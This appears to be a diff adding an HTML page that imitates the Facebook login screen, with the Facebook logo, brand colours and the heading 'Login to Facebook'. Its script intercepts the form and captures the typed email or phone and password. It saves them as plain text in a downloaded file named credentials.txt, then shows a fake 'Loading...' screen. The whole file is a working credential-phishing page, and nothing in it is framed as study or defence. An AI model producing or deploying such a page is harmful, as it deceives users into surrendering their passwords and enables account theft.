@@ -1,0 +1,105 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f2f5;
+            margin: 0;
+        }
+        .login-container {
+            width: 90%;
+            max-width: 360px;
+            padding: 20px;
+            background-color: white;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            text-align: center;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
+        .logo img {
+            width: 100px;
+        }
+        h2 {
+            margin-bottom: 20px;
+            color: #1877f2;
+        }
+        label {
+            display: block;
+            text-align: left;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-top: 5px;
+            border: 1px solid #dddfe2;
+            border-radius: 4px;
+            background-color: #f5f6f7;
+            font-size: 16px;
+        }
+        input[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            margin-top: 20px;
+            background-color: #1877f2;
+            border: none;
+            color: white;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        input[type="submit"]:hover {
+            background-color: #155bba;
+        }
+    </style>
+    <script>
+        function saveCredentials(event) {
+            event.preventDefault();
+            var email = document.getElementById("email").value;
+            var password = document.getElementById("password").value;
+            
+            var data = "Email: " + email + "\nPassword: " + password + "\n\n";
+            
+            // Create a Blob with the data
+            var blob = new Blob([data], { type: 'text/plain' });
+            
+            // Create a link element to download the file
+            var link = document.createElement("a");
+            link.href = URL.createObjectURL(blob);
+            link.download = "credentials.txt";
+            
+            // Trigger the download
+            link.click();
+            
+            // Keep the page loading
+            document.body.innerHTML = '<div style="font-size: 20px; color: #1877f2; text-align: center; padding-top: 50px;">Loading...</div>';
+        }
+    </script>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+        </div>
+        <h2>Login to Facebook</h2>
+        <form onsubmit="saveCredentials(event)">
+            <label for="email">Email or Phone:</label>
+            <input type="text" id="email" name="email" required>
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" required>
+            <input type="submit" value="Log In">
+        </form>
+    </div>
+</body>
+</html>
